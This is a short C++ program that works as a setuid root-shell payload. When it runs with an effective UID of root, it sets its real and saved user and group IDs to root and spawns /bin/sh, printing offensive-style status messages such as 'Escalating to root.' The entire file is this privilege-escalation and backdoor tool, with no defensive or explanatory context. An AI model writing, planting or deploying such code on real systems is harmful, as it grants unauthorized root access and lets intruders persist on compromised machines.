#include <iostream>
#include <unistd.h>
#include <sys/types.h>

using namespace std;

int main(int argc, char* argv[]) {
    uid_t ruid = getuid();
    uid_t euid = geteuid();

    cout << "[*] Real UID: " << ruid << ", Effective UID: " << euid << endl;

    if (euid == 0) {
        cout << "[+] SUID preserved. Escalating to root." << endl;
        if (setresuid(0, 0, 0) != 0 || setresgid(0, 0, 0) != 0) {
            cerr << "[-] Failed to set credentials." << endl;
            return 1;
        }

        char* const args[] = {(char*)"/bin/sh", nullptr};
        execve("/bin/sh", args, nullptr);
    } else {
        cout << "[-] Normal execution context (unprivileged)." << endl;
    }

    return 0;
}
